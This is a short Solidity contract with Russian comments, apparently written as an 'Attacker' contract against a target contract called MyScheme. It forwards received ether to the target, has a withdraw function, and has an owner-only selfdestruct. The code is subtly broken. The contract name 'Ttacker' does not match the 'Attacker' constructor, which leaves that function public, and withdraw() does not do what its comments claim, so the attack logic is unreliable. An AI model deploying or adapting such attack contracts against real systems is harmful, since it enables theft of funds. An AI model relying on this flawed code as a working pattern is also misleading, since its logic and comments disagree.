pragma solidity ^0.4.0;

contract Ttacker {
    address owner;
    address target;

    function Attacker(address _target) {
        owner = msg.sender;
        target = _target;
    }

    function() payable {
        // переводим все полученные эфиры на адрес контракта MyScheme
        target.send(msg.value);
    }

    function withdraw() {
        // вызываем функцию send() смарт контракта MyScheme
        // и указываем адрес контракта Attacker в качестве получателя
        // и адрес владельца MyScheme (1G) в качестве отправителя
        target.send(this.balance);
    }

    function kill() {
        // уничтожаем контракт и возвращаем оставшиеся эфиры владельцу Attacker
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}
